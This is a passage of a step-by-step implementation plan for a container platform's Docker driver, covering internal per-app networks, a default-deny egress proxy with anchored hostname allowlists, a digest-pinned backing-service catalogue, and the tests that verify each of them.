    // Reaching the HOST is the property under test, and 7100 may legitimately
    // refuse the connection when the control plane is not running — so probe the
    // registry, which is published on the host and always answering.
    expect(await curlExit('bridge', ['http://host.docker.internal:7107/v2/'])).toBe(0)
    expect(await curlExit('bridge', ['https://registry.npmjs.org/'])).toBe(0)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm test:docker
```

Expected: FAIL — `Cannot find module './networks.js'`.

- [ ] **Step 3: Write the network module**

`packages/control-plane/src/runtime/docker/networks.ts`:

```ts
import type { EngineClient } from './engine.js'
import { appNetwork, type EnvironmentKind } from './names.js'

/**
 * The platform containers that must be able to reach into every app network.
 * Caddy because §21 forbids the control plane from reaching container IPs, so the
 * edge is the only thing that can. dnsmasq because §12 makes the resolver
 * per-container and an internal network cannot forward a query off itself.
 */
export const PLATFORM_NEIGHBOURS = ['manifest-caddy', 'manifest-dnsmasq-containers']

/**
 * `Internal: true` is the whole east-west section of §12 expressed as one flag: no
 * gateway means no route to the host, so no control plane, no metadata endpoint, no
 * other app, and no accidental egress. Everything that legitimately needs in is
 * attached explicitly below.
 */
export async function ensureAppNetwork(
  engine: EngineClient,
  slug: string,
  kind: EnvironmentKind,
): Promise<string> {
  const name = appNetwork(slug, kind)
  const existing = await engine.get<{ Id: string }>(`/networks/${name}`)
  if (existing) {
    await attachPlatformNeighbours(engine, name, PLATFORM_NEIGHBOURS)
    return existing.Id
  }
  const created = await engine.post<{ Id: string }>('/networks/create', {
    Name: name,
    Driver: 'bridge',
    Internal: true,
    CheckDuplicate: true,
    Labels: { 'manifest.slug': slug, 'manifest.environment': kind },
  })
  await attachPlatformNeighbours(engine, name, PLATFORM_NEIGHBOURS)
  return created!.Id
}

/** Idempotent: the daemon answers 403 when the container is already attached. */
export async function attachPlatformNeighbours(
  engine: EngineClient,
  network: string,
  names: string[],
): Promise<void> {
  for (const container of names) {
    try {
      await engine.post(`/networks/${network}/connect`, { Container: container })
    } catch (error) {
      const message = (error as Error).message
      if (!message.includes('already exists in network')) throw error
    }
  }
}

export async function destroyAppNetwork(
  engine: EngineClient,
  slug: string,
  kind: EnvironmentKind,
): Promise<void> {
  const name = appNetwork(slug, kind)
  for (const container of PLATFORM_NEIGHBOURS) {
    try {
      await engine.post(`/networks/${name}/disconnect`, { Container: container, Force: true })
    } catch {
      /* not attached, or the network is already gone — both are the desired end state */
    }
  }
  await engine.del(`/networks/${name}`)
}
```

- [ ] **Step 4: Run the Docker tier**

```bash
pnpm test:docker
```

Expected: PASS — 6 network tests, including three denials and the bridge-network
positive control.

- [ ] **Step 5: Prove the denials come from `Internal: true`**

Change `Internal: true` to `Internal: false` in `ensureAppNetwork`, remove the network
by hand (`docker network rm mf-nettest-staging-net`) so it is recreated, and re-run.

Expected: **FAIL** on all three denial tests at once — the metadata endpoint, the
control plane and npmjs all become reachable. Restore the flag, remove the network
again, and confirm green.

**The one-line change failing three tests is the signal to look for.** If it fails only
one, the other two were passing for a reason other than the topology.

- [ ] **Step 6: Commit**

```bash
git add packages/control-plane/src/runtime/docker/networks.ts packages/control-plane/src/runtime/docker/networks.docker.test.ts
git commit -m "feat(runtime): per-app internal networks — §12's east-west denials as topology

Verified by removing Internal:true and watching all three denial tests fail."
```

---

## Task 5: The forced egress proxy, one per app+environment

**Files:**
- Create: `packages/control-plane/src/runtime/docker/egress.ts`
- Test: `packages/control-plane/src/runtime/docker/egress.test.ts`
- Test: `packages/control-plane/src/runtime/docker/egress.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient`, `egressContainer`, `appNetwork` (Task 1); `ensureAppNetwork` (Task 4).
- Produces:
  - `PLATFORM_EGRESS_BASELINE: readonly string[]`
  - `renderAllowlist(declared: string[]): string` — the tinyproxy filter file
  - `ensureEgressProxy(engine, { slug, kind, allow }): Promise<{ name: string; url: string }>`
  - `destroyEgressProxy(engine, slug, kind): Promise<void>`
  - `proxyEnvironment(url: string): Record<string, string>`

**Why one proxy per app and not one shared allowlist.** *Decisions*, item 5. tinyproxy's
filter is per-process, so a shared proxy can only hold the union of every app's
`egress.allow` — which hands app A every destination app B declared and destroys the
property §12 is buying: *"an app that suddenly needs a new outbound destination is a
signal, not a convenience."* One ~3 MB container per app environment is the price.

**The allowlist is anchored regular expressions, and the anchors matter.** tinyproxy's
`FilterExtended On` treats each line as an extended regular expression matched against
the host. An unanchored `ubc.ca` matches `ubc.ca.evil.example`. Every entry rendered
here is `^…$` with the dots escaped, and the unit test below is written around exactly
that attack.

**The proxy is the only container that is dual-homed**, onto the app's internal network
and the platform network — the same shape S1 established for the registry and mirror,
and for the same reason: a container attached only to an internal network cannot reach
anything off it.

- [ ] **Step 1: Write the failing unit test**

`packages/control-plane/src/runtime/docker/egress.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { PLATFORM_EGRESS_BASELINE, proxyEnvironment, renderAllowlist } from './egress.js'

describe('egress allowlist rendering (D18)', () => {
  it('always includes the platform baseline §12 names', () => {
    const rendered = renderAllowlist([])
    for (const entry of PLATFORM_EGRESS_BASELINE) expect(rendered).toContain(entry)
    expect(PLATFORM_EGRESS_BASELINE).toContain('^manifest-verdaccio$')
    expect(PLATFORM_EGRESS_BASELINE).toContain('^manifest-litellm$')
  })

  it('anchors and escapes every declared host', () => {
    expect(renderAllowlist(['api.ubc.ca'])).toContain('^api\\.ubc\\.ca$')
  })

  // THE ATTACK this anchoring exists for. Unanchored, `api.ubc.ca` matches
  // `api.ubc.ca.evil.example` and the app's egress policy is decorative.
  it('does not let a declared host match a longer attacker-controlled name', () => {
    const line = renderAllowlist(['api.ubc.ca'])
      .split('\n')
      .find((l) => l.includes('ubc'))!
    expect(new RegExp(line).test('api.ubc.ca')).toBe(true)
    expect(new RegExp(line).test('api.ubc.ca.evil.example')).toBe(false)
    expect(new RegExp(line).test('evil-api.ubc.ca')).toBe(false)
  })

  it('rejects an entry that is not a plain hostname rather than escaping it into nonsense', () => {
    expect(() => renderAllowlist(['*.ubc.ca'])).toThrow(/EGRESS_ALLOW_INVALID/)
    expect(() => renderAllowlist(['https://api.ubc.ca/path'])).toThrow(/EGRESS_ALLOW_INVALID/)
  })

  it('forces the proxy through the standard environment variables, with no bypass', () => {
    const env = proxyEnvironment('http://mf-chem-labs-staging-egress:8888')
    expect(env.HTTP_PROXY).toBe('http://mf-chem-labs-staging-egress:8888')
    expect(env.HTTPS_PROXY).toBe(env.HTTP_PROXY)
    expect(env.http_proxy).toBe(env.HTTP_PROXY)
    expect(env.https_proxy).toBe(env.HTTP_PROXY)
    // NO_PROXY covers only what must never leave the app network: its own
    // services, by name. Anything broader is a hole in the forced proxy.
    expect(env.NO_PROXY).toBe('localhost,127.0.0.1')
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/egress
```

Expected: FAIL — `Cannot find module './egress.js'`.

- [ ] **Step 3: Write the egress module**

`packages/control-plane/src/runtime/docker/egress.ts`:

```ts
import type { EngineClient } from './engine.js'
import { appNetwork, egressContainer, type EnvironmentKind } from './names.js'

/**
 * §12's platform baseline: the package mirror, the AI proxy and the IdP. NOT the
 * public registries — Verdaccio is the only dependency source, which is what makes
 * C1's offline claim true and gives the supply-chain controls something to enforce.
 */
export const PLATFORM_EGRESS_BASELINE: readonly string[] = [
  '^manifest-verdaccio$',
  '^manifest-litellm$',
  '^manifest-idp$',
]
// NOT `manifest-registry`. §12's baseline is "the registry MIRROR, LiteLLM, the
// Manifest IdP" — the package mirror, not the image registry. A running app has no
// reason to reach the image registry, and §13 spends a section on making sure it
// cannot push to one. P1's own `manifest-egress` allowlist is the platform's and is
// a different file.

const HOSTNAME = /^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/i

export class EgressError extends Error {
  readonly code = 'EGRESS_ALLOW_INVALID'
  constructor(
    readonly entry: string,
    readonly hint: string,
  ) {
    super(`EGRESS_ALLOW_INVALID: '${entry}' is not a plain hostname`)
    this.name = 'EgressError'
  }
}

/**
 * Anchored and escaped, always. tinyproxy matches each line as an extended regular
 * expression against the host, so an unanchored `api.ubc.ca` also matches
 * `api.ubc.ca.evil.example` — the allowlist would then be decorative.
 */
export function renderAllowlist(declared: readonly string[]): string {
  const entries = declared.map((host) => {
    if (!HOSTNAME.test(host)) {
      throw new EgressError(
        host,
        'egress.allow takes bare hostnames — no scheme, no path, no wildcard. ' +
          'Wildcards are refused rather than translated, because the translation is where the hole gets in.',
      )
    }
    return `^${host.replace(/\./g, '\\.')}$`
  })
  return [
    '# Generated by the Manifest Docker driver. Do not edit.',
    '# Platform baseline (§12) followed by this app\'s declared egress.allow.',
    ...PLATFORM_EGRESS_BASELINE,
    ...entries,
    '',
  ].join('\n')
}

/** The forced proxy, in the four spellings every HTTP client actually reads. */
export function proxyEnvironment(url: string): Record<string, string> {
  return {
    HTTP_PROXY: url,
    HTTPS_PROXY: url,
    http_proxy: url,
    https_proxy: url,
    NO_PROXY: 'localhost,127.0.0.1',
  }
}

export async function ensureEgressProxy(
  engine: EngineClient,
  input: { slug: string; kind: EnvironmentKind; allow: readonly string[] },
): Promise<{ name: string; url: string }> {
  const name = egressContainer(input.slug, input.kind)
  const url = `http://${name}:8888`
  const existing = await engine.get<{ State: { Running: boolean } }>(`/containers/${name}/json`)
  if (existing) {
    if (!existing.State.Running) await engine.post(`/containers/${name}/start`)
    return { name, url }
  }

  // The allowlist is passed as the container's command rather than a bind mount:
  // the control plane is a host process and the daemon is in a VM, so a host path
  // is not necessarily visible to it. Writing the file from inside the container
  // keeps the driver free of any assumption about shared filesystems.
  const allowlist = renderAllowlist(input.allow)
  const config = [
    'Port 8888', 'Listen 0.0.0.0', 'Timeout 600', 'LogLevel Warning', 'MaxClients 32',
    'FilterDefaultDeny Yes', 'Filter "/tmp/allowlist"', 'FilterURLs Off', 'FilterExtended On',
  ].join('\n')

  await engine.post(`/containers/create?name=${name}`, {
    // manifest-egress:local, NOT vimagick/tinyproxy. P1 replaced that image
    // because it is amd64-only and ran under emulation on arm64; the local build
    // is native and, unlike vimagick, is present offline. Its tinyproxy.conf must
    // also set DefaultErrorFile, or the proxy EXITS after serving each denial.
    Image: 'manifest-egress:local',
    Entrypoint: ['/bin/sh', '-c'],
    Cmd: [
      `printf '%s\\n' "$ALLOWLIST" > /tmp/allowlist && ` +
        `printf '%s\\n' "$TINYPROXY_CONF" > /tmp/tinyproxy.conf && ` +
        `exec tinyproxy -d -c /tmp/tinyproxy.conf`,
    ],
    Env: [`ALLOWLIST=${allowlist}`, `TINYPROXY_CONF=${config}`],
    HostConfig: {
      NetworkMode: appNetwork(input.slug, input.kind),
      CapDrop: ['ALL'],
      SecurityOpt: ['no-new-privileges'],
      Privileged: false,
      PidsLimit: 64,
      Memory: 64 * 1024 * 1024,
      RestartPolicy: { Name: 'unless-stopped' },
    },
    Labels: { 'manifest.slug': input.slug, 'manifest.environment': input.kind },
  })
  // DUAL-HOMED, and this is the one container that is. The app network is internal;
  // the proxy is the only thing on it with a way out (S1's registry pattern).
  await engine.post('/networks/manifest-platform/connect', { Container: name })
  await engine.post(`/containers/${name}/start`)
  return { name, url }
}

export async function destroyEgressProxy(
  engine: EngineClient,
  slug: string,
  kind: EnvironmentKind,
): Promise<void> {
  await engine.del(`/containers/${egressContainer(slug, kind)}?force=true&v=true`)
}
```

- [ ] **Step 4: Write the Docker-tier test**

`packages/control-plane/src/runtime/docker/egress.docker.test.ts`:

```ts
import { afterAll, beforeAll, expect, it } from 'vitest'
import { createEngineClient, resolveSocketPath } from './engine.js'
import { describeDocker } from './docker-tier.js'
import { destroyEgressProxy, ensureEgressProxy, proxyEnvironment } from './egress.js'
import { appNetwork } from './names.js'
import { destroyAppNetwork, ensureAppNetwork } from './networks.js'

const engine = createEngineClient({ socketPath: resolveSocketPath() })
const SLUG = 'egresstest'
const KIND = 'staging' as const
let proxyUrl = ''

async function curlThroughProxy(target: string): Promise<number> {
  const env = proxyEnvironment(proxyUrl)
  const created = await engine.post<{ Id: string }>('/containers/create', {
    Image: 'curlimages/curl:8.11.1',
    Env: Object.entries(env).map(([k, v]) => `${k}=${v}`),
    Cmd: ['-sS', '-m', '8', '-o', '/dev/null', '-f', target],
    HostConfig: { NetworkMode: appNetwork(SLUG, KIND) },
  })
  const id = created!.Id
  try {
    await engine.post(`/containers/${id}/start`)
    return (await engine.post<{ StatusCode: number }>(`/containers/${id}/wait`))!.StatusCode
  } finally {
    await engine.del(`/containers/${id}?force=true&v=true`)
  }
}

describeDocker('forced default-deny egress (D18)', () => {
  beforeAll(async () => {
    await ensureAppNetwork(engine, SLUG, KIND)
    proxyUrl = (await ensureEgressProxy(engine, { slug: SLUG, kind: KIND, allow: [] })).url
  })
  afterAll(async () => {
    await destroyEgressProxy(engine, SLUG, KIND)
    await destroyAppNetwork(engine, SLUG, KIND)
  })

  it('is idempotent', async () => {
    const again = await ensureEgressProxy(engine, { slug: SLUG, kind: KIND, allow: [] })
    expect(again.url).toBe(proxyUrl)
  })

  it('ALLOWS the platform baseline — the package mirror', async () => {
    expect(await curlThroughProxy('http://manifest-verdaccio:4873/-/ping')).toBe(0)
  })

  it('DENIES an undeclared destination', async () => {
    expect(await curlThroughProxy('https://example.com/')).not.toBe(0)
  })

  it('ALLOWS a destination this app declared, and only this app', async () => {
    await destroyEgressProxy(engine, SLUG, KIND)
    proxyUrl = (
      await ensureEgressProxy(engine, { slug: SLUG, kind: KIND, allow: ['example.com'] })
    ).url
    expect(await curlThroughProxy('https://example.com/')).toBe(0)
    // Still denied: a neighbour's declaration is not this app's.
    expect(await curlThroughProxy('https://example.org/')).not.toBe(0)
  })
})
```

- [ ] **Step 5: Run both tiers**

```bash
pnpm test && pnpm test:docker
```

Expected: 5 unit tests and 4 Docker tests green. The third Docker test is the one that
distinguishes this design from a shared allowlist: `example.com` is reachable because
**this app** declared it.

- [ ] **Step 6: Prove `FilterDefaultDeny` is what denies**

Change `'FilterDefaultDeny Yes'` to `'FilterDefaultDeny No'` in `ensureEgressProxy`,
remove the proxy container, and re-run the Docker tier.

Expected: **FAIL** on *"DENIES an undeclared destination"* — `example.com` becomes
reachable while every other test stays green. Restore it.

- [ ] **Step 7: Commit**

```bash
git add packages/control-plane/src/runtime/docker/egress.ts packages/control-plane/src/runtime/docker/egress.test.ts packages/control-plane/src/runtime/docker/egress.docker.test.ts
git commit -m "feat(runtime): per-app forced egress proxy with an anchored default-deny allowlist

One proxy per app+environment, not a shared union: a shared allowlist silently
grants every app every other app's declared destinations."
```

---

## Task 6: `services/` — dedicated backing services, platform-owned and platform-pinned

**Files:**
- Create: `packages/control-plane/src/services/catalogue.ts`
- Create: `packages/control-plane/src/services/credentials.ts`
- Create: `packages/control-plane/src/services/index.ts`
- Create: `packages/control-plane/src/runtime/docker/services.ts`
- Test: `packages/control-plane/src/services/catalogue.test.ts`
- Test: `packages/control-plane/src/runtime/docker/services.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient`, `serviceContainer`, `serviceVolume`, `appNetwork` (Task 1); `ensureAppNetwork` (Task 4); `ServiceBinding`, `ServiceHandle` from `../driver.js`.
- Produces:
  - `SERVICE_CATALOGUE: Record<'mongo' | 'qdrant', ServiceImage>` where `ServiceImage = { image: string; digest: string; port: number; supportedVersions: string[] }`
  - `resolveServiceImage(type: string, version: string): ServiceImage` — throws `ServiceCatalogueError`
  - `deriveCredentials(secret, binding): { username; password; database }`
  - `ensureServiceContainer(engine, binding, kind): Promise<ServiceHandle>`
  - `destroyServiceContainer(engine, name, opts: { deleteData: boolean }): Promise<void>`

**§20: service images are platform-owned and platform-pinned; apps choose a supported
version line, not an arbitrary tag.** That is the whole reason a catalogue exists
rather than a `spec.services[].image` field. Both digests below were read off this
machine on 2026-08-31 and S1 provisioned Mongo from the first one.

**What this task deliberately does not do: render §8's variables.** §8 says *"the
`spec/` module owns the mapping from a declared service to its full variable set"*,
and the injection contract and its drift test are **P4's** (the roadmap and P2's
*What this plan does not build* both say so). P3 produces a `ServiceHandle` with an
endpoint and credentials; P4 turns that into `MONGODB_URI` and `MONGODB_DB_NAME`.
Building the §8 table here would mean building it twice.

**Credentials are derived, not stored, and that is temporary.** P3 has no `secrets/`
module — it is P4's. Deriving them with an HMAC over `(slug, environment, service)`
keyed by the control plane's secret makes `ensureService` genuinely idempotent (the
second call produces the same credentials, so the contract's *"returns the same
handle"* is true of what is inside the handle too). **P4 replaces this with envelope
encryption in Postgres**, and the function is deliberately one call site wide so that
replacement is a small diff.

- [ ] **Step 1: Write the failing unit test**

`packages/control-plane/src/services/catalogue.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { SERVICE_CATALOGUE, ServiceCatalogueError, deriveCredentials, resolveServiceImage } from './index.js'

describe('the platform service catalogue (§20)', () => {
  it('pins every image by digest, never by tag alone', () => {
    for (const entry of Object.values(SERVICE_CATALOGUE)) {
      expect(entry.digest).toMatch(/^sha256:[0-9a-f]{64}$/)
    }
  })

  it('resolves a supported version line', () => {
    const mongo = resolveServiceImage('mongo', '7')
    expect(mongo.image).toBe('mongodb/mongodb-community-server')
    expect(mongo.port).toBe(27017)
  })

  // An app choosing an arbitrary tag is what §20's "platform-owned, platform-pinned"
  // exists to prevent — otherwise the fleet-wide "rebuild every app on base image X"
  // operation has no fleet to speak of.
  it('refuses a version line the platform does not support', () => {
    expect(() => resolveServiceImage('mongo', '4')).toThrow(ServiceCatalogueError)
    expect(() => resolveServiceImage('postgres', '16')).toThrow(ServiceCatalogueError)
  })
})

describe('derived service credentials', () => {
  const binding = {
    name: 'chem-labs-staging-db', type: 'mongo', version: '7',
    environmentId: 'env-1', projectSlug: 'chem-labs',
  }

  it('is deterministic, which is what makes ensureService idempotent', () => {
    expect(deriveCredentials('secret'.repeat(6), binding)).toEqual(
      deriveCredentials('secret'.repeat(6), binding),
    )
  })

  it('differs per app and per environment', () => {
    const a = deriveCredentials('secret'.repeat(6), binding)
    const b = deriveCredentials('secret'.repeat(6), { ...binding, name: 'chem-labs-production-db' })
    expect(b.password).not.toBe(a.password)
  })

  // §11, stated concretely because it is easy to violate by accident: a sandbox
  // never receives staging or production secrets. Different name => different key.
  it('gives a sandbox its own throwaway credentials', () => {
    const staging = deriveCredentials('secret'.repeat(6), binding)
    const sandbox = deriveCredentials('secret'.repeat(6), { ...binding, name: 'chem-labs-sandbox-db' })
    expect(sandbox.password).not.toBe(staging.password)
  })

  it('never emits a password containing a URI delimiter', () => {
    const { password } = deriveCredentials('secret'.repeat(6), binding)
    expect(password).toMatch(/^[0-9a-f]{32}$/)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/services/
```

Expected: FAIL — `Cannot find module './index.js'`.

- [ ] **Step 3: Write the catalogue and the credential derivation**

`packages/control-plane/src/services/catalogue.ts`:

```ts
export interface ServiceImage {
  image: string
  /** §12: pinned by digest, not tag. Read off this machine on 2026-08-31. */
  digest: string
  port: number
  supportedVersions: string[]
}

export class ServiceCatalogueError extends Error {
  readonly code = 'SERVICE_NOT_IN_CATALOGUE'
  constructor(
    message: string,
    readonly hint: string,
  ) {
    super(message)
    this.name = 'ServiceCatalogueError'
  }
}

/**
 * §20: "service images are platform-owned and platform-pinned; apps choose a
 * supported version line, not an arbitrary tag". This is that sentence. It is also
 * what makes the fleet-wide "rebuild every app on base image X" operation possible
 * later — there is a fleet only if the platform chose the images.
 */
export const SERVICE_CATALOGUE: Record<'mongo' | 'qdrant', ServiceImage> = {
  mongo: {
    image: 'mongodb/mongodb-community-server',
    digest: 'sha256:56d07a0227ceeb04ba763bfe5681660c465114d2f6fb943e8e8f3718134b5436',
    port: 27017,
    supportedVersions: ['7'],
  },
  // §21: opt-in, not part of the default blueprint — one per app per environment is
  // affordable on UBC infrastructure and is not affordable on a laptop.
  qdrant: {
    image: 'qdrant/qdrant',
    digest: 'sha256:94728574965d17c6485dd361aa3c0818b325b9016dac5ea6afec7b4b2700865f',
    port: 6333,
    supportedVersions: ['1'],
  },
}

export function resolveServiceImage(type: string, version: string): ServiceImage {
  const entry = SERVICE_CATALOGUE[type as keyof typeof SERVICE_CATALOGUE]
  if (!entry) {
    throw new ServiceCatalogueError(
      `no platform image for service type '${type}'`,
      `Supported types: ${Object.keys(SERVICE_CATALOGUE).join(', ')}.`,
    )
  }
  if (!entry.supportedVersions.includes(version)) {
    throw new ServiceCatalogueError(
      `'${type}' version line '${version}' is not supported`,
      `Supported version lines for ${type}: ${entry.supportedVersions.join(', ')}. ` +
        'Apps choose a version line, never an image tag (§20).',
    )
  }
  return entry
}
```

`packages/control-plane/src/services/credentials.ts`:

```ts
import { createHmac } from 'node:crypto'
import type { ServiceBinding } from '../runtime/index.js'

/**
 * TEMPORARY, and one call site wide on purpose. P4 replaces this with `secrets/`
 * (libsodium sealed boxes in Postgres, §12). Deriving instead of storing is what
 * makes `ensureService` idempotent all the way down: the second call produces the
 * same credentials, so the same handle really is the same handle.
 *
 * The binding name carries the environment (§11's serviceName), so a sandbox
 * cannot derive staging's password — §11's "a sandbox never receives staging or
 * production secrets", enforced by the key rather than by remembering.
 */
export function deriveCredentials(
  masterSecret: string,
  binding: Pick<ServiceBinding, 'name' | 'type' | 'projectSlug'>,
): { username: string; password: string; database: string } {
  const mac = (purpose: string) =>
    createHmac('sha256', masterSecret).update(`${purpose}:${binding.name}`).digest('hex')
  return {
    username: `app_${mac('user').slice(0, 12)}`,
    // Hex only: a password with `:`, `/` or `@` in it silently corrupts the URI
    // P4 builds from it, and the failure looks like an authentication problem.
    password: mac('pass').slice(0, 32),
    database: `${binding.projectSlug.replace(/-/g, '_')}`,
  }
}
```

`packages/control-plane/src/services/index.ts`:

```ts
export { SERVICE_CATALOGUE, ServiceCatalogueError, resolveServiceImage } from './catalogue.js'
export type { ServiceImage } from './catalogue.js'
export { deriveCredentials } from './credentials.js'
```

- [ ] **Step 4: Write the driver-side provisioning**

`packages/control-plane/src/runtime/docker/services.ts`:

```ts
import type { ServiceBinding, ServiceHandle } from '../driver.js'
import { deriveCredentials, resolveServiceImage } from '../../services/index.js'
import type { EngineClient } from './engine.js'
import { appNetwork, serviceContainer, serviceVolume, type EnvironmentKind } from './names.js'

/** D3: dedicated per app+environment. The container IS the isolation boundary. */
export async function ensureServiceContainer(
  engine: EngineClient,
  binding: ServiceBinding,
  kind: EnvironmentKind,
  masterSecret: string,
): Promise<ServiceHandle> {
  const image = resolveServiceImage(binding.type, binding.version)
  const creds = deriveCredentials(masterSecret, binding)
  // `binding.name` is P2's serviceName(project, environment, declared); the Docker
  // name is that with our prefix. One derivation, not two.
  const name = serviceContainer(binding.name)
  const volume = serviceVolume(binding.name)
  const endpoint = `${binding.type}://${creds.username}:${creds.password}@${name}:${image.port}/${creds.database}`

  const existing = await engine.get<{ Id: string; State: { Running: boolean } }>(
    `/containers/${name}/json`,
  )
  if (existing) {
    if (!existing.State.Running) await engine.post(`/containers/${name}/start`)
    return { id: name, name, endpoint }
  }

  await engine.post('/volumes/create', { Name: volume, Labels: { 'manifest.slug': binding.projectSlug } })
  await engine.post(`/containers/create?name=${name}`, {
    Image: `${image.image}@${image.digest}`,
    Env: [
      `MONGODB_INITDB_ROOT_USERNAME=${creds.username}`,
      `MONGODB_INITDB_ROOT_PASSWORD=${creds.password}`,
    ],
    HostConfig: {
      // On the app's INTERNAL network only. A service is never reachable from
      // another app, and never publishes a port.
      NetworkMode: appNetwork(binding.projectSlug, kind),
      Binds: [`${volume}:/data/db`],
      CapDrop: ['ALL'],
      SecurityOpt: ['no-new-privileges'],
      Privileged: false,
      PidsLimit: 256,
      Memory: 512 * 1024 * 1024,
      RestartPolicy: { Name: 'unless-stopped' },
    },
    Labels: { 'manifest.slug': binding.projectSlug, 'manifest.environment': kind },
  })
  await engine.post(`/containers/${name}/start`)
  return { id: name, name, endpoint }
}

/**
 * §11 makes `deleteData` meaningful in BOTH directions, and S1 verified both:
 * false keeps the volume, true removes it. Getting this backwards destroys a
 * production database on a redeploy, so the Docker-tier test asserts each way.
 */
export async function destroyServiceContainer(
  engine: EngineClient,
  name: string,
  opts: { deleteData: boolean },
): Promise<void> {
  await engine.del(`/containers/${name}?force=true`)
  if (opts.deleteData) await engine.del(`/volumes/${name}-data?force=true`)
}
```

- [ ] **Step 5: Write the Docker-tier test**

`packages/control-plane/src/runtime/docker/services.docker.test.ts`:

```ts
import { afterAll, beforeAll, expect, it } from 'vitest'
import type { ServiceBinding } from '../driver.js'
import { serviceName } from '../driver.js'
import { createEngineClient, resolveSocketPath } from './engine.js'
import { describeDocker } from './docker-tier.js'
import { serviceVolume } from './names.js'
import { destroyAppNetwork, ensureAppNetwork } from './networks.js'
import { destroyServiceContainer, ensureServiceContainer } from './services.js'

const engine = createEngineClient({ socketPath: resolveSocketPath() })
const SECRET = 'x'.repeat(32)
const SLUG = 'svctest'
const binding: ServiceBinding = {
  name: serviceName(SLUG, 'staging', 'db'),
  type: 'mongo', version: '7', environmentId: 'env-1', projectSlug: SLUG,
}

const volumeExists = async (): Promise<boolean> =>
  (await engine.get(`/volumes/${serviceVolume(binding.name)}`)) !== undefined

describeDocker('dedicated backing services (D3)', () => {
  beforeAll(async () => {
    await ensureAppNetwork(engine, SLUG, 'staging')
  })
  afterAll(async () => {
    await destroyServiceContainer(engine, `mf-${binding.name}`, { deleteData: true })
    await destroyAppNetwork(engine, SLUG, 'staging')
  })

  it('creates the service and the second call is a no-op', async () => {
    const first = await ensureServiceContainer(engine, binding, 'staging', SECRET)
    const second = await ensureServiceContainer(engine, binding, 'staging', SECRET)
    expect(second.id).toBe(first.id)
    expect(second.endpoint).toBe(first.endpoint)
  })

  it('publishes no port and sits on the app network only', async () => {
    const inspect = await engine.get<{
      NetworkSettings: { Ports: Record<string, unknown>; Networks: Record<string, unknown> }
    }>(`/containers/mf-${binding.name}/json`)
    expect(Object.keys(inspect!.NetworkSettings.Ports)).toEqual([])
    expect(Object.keys(inspect!.NetworkSettings.Networks)).toEqual(['mf-svctest-staging-net'])
  })

  it('runs the digest-pinned catalogue image, not a tag', async () => {
    const inspect = await engine.get<{ Config: { Image: string } }>(
      `/containers/mf-${binding.name}/json`,
    )
    expect(inspect!.Config.Image).toContain('@sha256:')
  })

  // THE ASSERTION THAT MATTERS, and the one it is easiest to leave out. "The
  // container is running" and "the credentials in the endpoint actually
  // authenticate" are different claims, and the environment-variable names are
  // image-specific: `mongodb/mongodb-community-server` reads MONGODB_INITDB_*
  // while the Docker-official `mongo` image reads MONGO_INITDB_*. Getting that
  // wrong starts a Mongo with NO authentication at all and every other test here
  // stays green.
  it('accepts the derived credentials — and rejects a wrong one', async () => {
    const handle = await ensureServiceContainer(engine, binding, 'staging', SECRET)
    const ping = async (uri: string): Promise<number> => {
      const created = await engine.post<{ Id: string }>('/containers/create', {
        Image: 'mongodb/mongodb-community-server:7.0.28-ubi8',
        Entrypoint: ['mongosh'],
        Cmd: [uri, '--quiet', '--eval', 'db.runCommand({ping:1}).ok'],
        HostConfig: { NetworkMode: 'mf-svctest-staging-net' },
      })
      const id = created!.Id
      try {
        await engine.post(`/containers/${id}/start`)
        return (await engine.post<{ StatusCode: number }>(`/containers/${id}/wait`))!.StatusCode
      } finally {
        await engine.del(`/containers/${id}?force=true&v=true`)
      }
    }
    expect(await ping(handle.endpoint)).toBe(0)
    expect(await ping(handle.endpoint.replace(/:[^:@]+@/, ':wrong-password@'))).not.toBe(0)
  })

  it('honours deleteData:false — the volume survives', async () => {
    await destroyServiceContainer(engine, `mf-${binding.name}`, { deleteData: false })
    expect(await volumeExists()).toBe(true)
  })

  it('honours deleteData:true — the volume goes', async () => {
    await ensureServiceContainer(engine, binding, 'staging', SECRET)
    await destroyServiceContainer(engine, `mf-${binding.name}`, { deleteData: true })
    expect(await volumeExists()).toBe(false)
  })
})
```

- [ ] **Step 6: Run both tiers**

```bash
pnpm test && pnpm test:docker
```

Expected: 8 unit tests, 6 Docker tests.

- [ ] **Step 7: Prove `deleteData` is not a no-op in either direction**

Change `if (opts.deleteData)` to `if (true)` and re-run the Docker tier.

Expected: **FAIL** on *"honours deleteData:false — the volume survives"* and only that
one. Then change it to `if (false)` — expect **FAIL** on *"honours deleteData:true"*
only. Restore.

Both directions, because a flag that is ignored one way destroys data and a flag that
is ignored the other way leaks it. One test would have caught only one of those.

- [ ] **Step 8: Commit**

```bash
git add packages/control-plane/src/services/ packages/control-plane/src/runtime/docker/services.ts packages/control-plane/src/runtime/docker/services.docker.test.ts
git commit -m "feat(services): dedicated per-app services from a platform-pinned catalogue (D3, §20)

deleteData verified in both directions by inverting it and watching each
direction's test fail alone."
```

---

## Task 7: `ensureInstance`, `stopInstance`, `destroyInstance`, `status`

**Files:**
- Create: `packages/control-plane/src/runtime/docker/instances.ts`
- Test: `packages/control-plane/src/runtime/docker/instances.test.ts`
- Test: `packages/control-plane/src/runtime/docker/instances.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient`, `appContainer` (Task 1); `hardenedHostConfig` (Task 3); `ensureAppNetwork` (Task 4); `proxyEnvironment` (Task 5); `InstanceSpec`, `InstanceHandle`, `InstanceStatus`, `InstanceState` from `../driver.js`.
- Produces:
  - `dockerStateToInstanceState(state: DockerState): InstanceState` — a pure function
  - `interface DockerState { Status: string; ExitCode: number; Health?: { Status: string }; hibernationMarker: boolean }`
  - `ensureInstanceContainer(engine, spec, deps): Promise<InstanceHandle>`
  - `stopInstanceContainer(engine, id): Promise<void>`
  - `destroyInstanceContainer(engine, id): Promise<void>`
  - `instanceStatus(engine, id): Promise<InstanceStatus>`

**The hard part is telling hibernation from a crash, and Docker cannot.**
Both leave the container in `exited`. The obvious mapping — `exited → hibernated` —
